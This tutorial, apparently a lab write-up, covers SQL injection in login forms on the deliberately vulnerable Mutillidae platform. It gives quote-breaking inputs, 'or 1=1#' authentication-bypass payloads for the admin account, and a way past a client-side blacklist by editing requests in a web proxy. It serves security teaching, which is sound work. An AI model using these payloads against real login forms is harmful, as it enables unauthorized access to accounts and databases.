### SQL Injection In Login Forms

* SQLinjection is a type of vulnerability which gives the attacker access to a database where sensitive information is stored.
* The attacker will execute malicious code, as to retreive information from the database or to even destroy using the drop statement.

* In this tutorial i will be using the mutillidae platform.

---

### Discovering SQL Injections in Post

* Our first step in SQL injection is finding out if the site is infact vulnerable to SQLi.
* To do this we need to look for parameters in the url or text fields e.g. for username and password. We have to try and break the statement.
* We can use and, ', ", . and various other characters to break the statement.


* Ok so now i'm going to try and break the sql query in the login form.
* I first created user account on the page now i'm going bypass authentication.

'''
Name: noone
Password: '
'''

* What i did here was use my username noone that i created to in registeration process and a single quote in the password field.
* This broke the sql query as i have recieved a sql 

```
Error executing query: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1
```

* The above is the message i recieved for the error.

* Plus the server gives me some diagonstic information.

```
SELECT * FROM accounts WHERE username='noone' AND password='''
```

* Most websites will not have this verbose information on the error. Most sites might have some parts of the pages missing etc.

* The database automatically creates quotes around our input. So in the case of the single quotes it wrapped that around with two  single quotes giving it a error as there is now three single quotes.

* Now i'm going to bypass authentication but first we need to visualize

```
SELECT * FROM accounts WHERE username='noone' AND password='noone'
```

* The statement above is the one that executes at backend database.
* So what i'm going to try and see is if i give the correct username and password with a false statement would it allow me login

```
Name: noone
Password: noone' and 1=2#
```

* So what i did from above is test my username and password which are both correct followed by false statement with and 1=2 with comment.
* The comment is used to comment out the single quote and this doesn't get run by the backend database.

* The database query will look something like this.

```
SELECT * from account where username='noone' AND password='noone' and 1=2#'
```

* This will not login me as with the and statement both statements need to be true to become executed but 1=2 is not true, so therefore i cannot login.

 
---

### Bypassing Login using SQL injection

* In this part i'm going to use a method to bypass authentication using the admin username and the or statement.
* So we already know the sql query used for the login.

```
SELECT * from accounts WHERE username='$USERNAME' AND password='$PASSWORD'
```

* Here what we can do is login with username admin and combine that with any password followed by a true or statement.

```
Username: admin
Password: 111' or 1=1#
```

* The SQL Query will look something like this.
```
SELECT * FROM accounts WHERE username='admin' and password='111' or 1=1#'
```

* This is statement will execute as for or statements only one statment needs to be true for the whole query to be true.

```
Logged In Admin: admin (Monkey!)
```
 
---

### Bypassing More Secure Logins Using SQL Injections

* In this section i will have to bypass some sort of filtering. As i set the security level to 1 before it was 0.
* When i try the previous methods on this login form

```
Username: admin
Password: 111' or 1=1#
```

* The following message is displayed.

```
Dangerous characters detected. We can't allow these. This all powerful blacklist will stop such attempts.

Much like padlocks, filtering cannot be defeated.

Blacklisting is l33t like l33tspeak.
```

* Now we first need to find out if the filtering is happening in the client side or the server side.
* If the filtering is happening on the client side we can bypass this by using web proxy e.g. burp, zap etc.

* So i first capture the request after i enter in the details in the for the username and password.

```
Username: admin
Password: 111
```
* Actually it looks like numbers are filtered as well so we have to change the password.
```
Username: admin
Password: admin
```

* Now we capture the request and in the web proxy we change the password field.
```
Username: admin
Password: admin' or 1=1#
```

* Which should bypass authentication.

